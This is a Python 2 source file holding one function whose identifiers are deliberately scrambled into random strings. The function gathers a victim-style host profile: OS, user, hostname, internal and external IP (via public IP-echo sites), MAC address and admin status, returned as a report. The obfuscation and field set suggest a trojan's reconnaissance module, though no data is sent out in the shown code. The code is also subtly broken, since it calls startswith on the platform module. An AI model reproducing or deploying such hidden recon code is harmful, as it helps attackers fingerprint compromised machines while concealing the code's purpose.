# -*- coding: utf-8 -*-
import ctypes
import getpass
import os
import platform
import socket
import urllib
import uuid
def ARakDxFSUheNtJlTHfcXYGrHeJqrDiaq(plat_type):
    JVmRIYyhtvXBDWYNUUVeQuYgQxkQqSRS = platform.platform()
    processor    = platform.processor()
    architecture = platform.architecture()[0]
    VRWXUoSjXAbBusyhiWkiysNtazYdXwPD = getpass.getuser()
    JkeCHzeBzOfgvRejYdwohVmGLPTYoPdl    = socket.gethostname()
    bQomPMeRSAXnEnCvBwqKteQpamovIEYK        = socket.getfqdn()
    ZFGAcTySaVaPzNidGzlNmtErhyTmUpVt = socket.gethostbyname(JkeCHzeBzOfgvRejYdwohVmGLPTYoPdl)
    nCupYdZsRReKtnwWLhZqjePSBjgDMBBP     = uuid.getnode()
    ahSqfqLLhzyFlbeaikiQAMUSOzydlCLN         = ':'.join(("%012X" % nCupYdZsRReKtnwWLhZqjePSBjgDMBBP)[kJsMTlOenjgnlvKLOJTqQqAwyESQpoCs:kJsMTlOenjgnlvKLOJTqQqAwyESQpoCs+2] for kJsMTlOenjgnlvKLOJTqQqAwyESQpoCs in range(0, 12, 2))
    DLnCpoaWWGWzsvSbyDtGSSjPJGUpGMWi = [ 'ipinfo.io/ip', 'icanhazip.com', 'ident.me',
                   'ipecho.net/plain', 'myexternalip.com/raw' ]
    fGhWetlfJsqYDIqGLYtndCkzYDjFcmJc = ''
    for fzXeczXGLhpJOfWdZElFRIoIeGiUwvoU in DLnCpoaWWGWzsvSbyDtGSSjPJGUpGMWi:
        try:
            fGhWetlfJsqYDIqGLYtndCkzYDjFcmJc = urllib.urlopen('http://'+fzXeczXGLhpJOfWdZElFRIoIeGiUwvoU).read().rstrip()
        except IOError:
            pass
        if fGhWetlfJsqYDIqGLYtndCkzYDjFcmJc and (6 < len(fGhWetlfJsqYDIqGLYtndCkzYDjFcmJc) < 16):
            break
    JKzZTHbaEoymVNxsDYIkLQwIMxCKpxTF = False
    if plat_type.startswith('win'):
        JKzZTHbaEoymVNxsDYIkLQwIMxCKpxTF = ctypes.windll.shell32.IsUserAnAdmin() != 0
    elif plat_type.startswith('linux') or platform.startswith('darwin'):
        JKzZTHbaEoymVNxsDYIkLQwIMxCKpxTF = os.getuid() == 0
    OhoIRypBVYNCHlePjqEKoHlQKQnPRoKR = 'Yes' if JKzZTHbaEoymVNxsDYIkLQwIMxCKpxTF else 'No'
    HYaFkryVhUObaaOyqrnxTuMhUILBwDis = '''
    System Platform     - {}
    Processor           - {}
    Architecture        - {}
    Hostname            - {}
    FQDN                - {}
    Internal IP         - {}
    External IP         - {}
    MAC Address         - {}
    Current User        - {}
    Admin Access        - {}
    '''.format(JVmRIYyhtvXBDWYNUUVeQuYgQxkQqSRS, processor, architecture,
    JkeCHzeBzOfgvRejYdwohVmGLPTYoPdl, bQomPMeRSAXnEnCvBwqKteQpamovIEYK, ZFGAcTySaVaPzNidGzlNmtErhyTmUpVt, fGhWetlfJsqYDIqGLYtndCkzYDjFcmJc, ahSqfqLLhzyFlbeaikiQAMUSOzydlCLN, VRWXUoSjXAbBusyhiWkiysNtazYdXwPD, OhoIRypBVYNCHlePjqEKoHlQKQnPRoKR)
    return HYaFkryVhUObaaOyqrnxTuMhUILBwDis
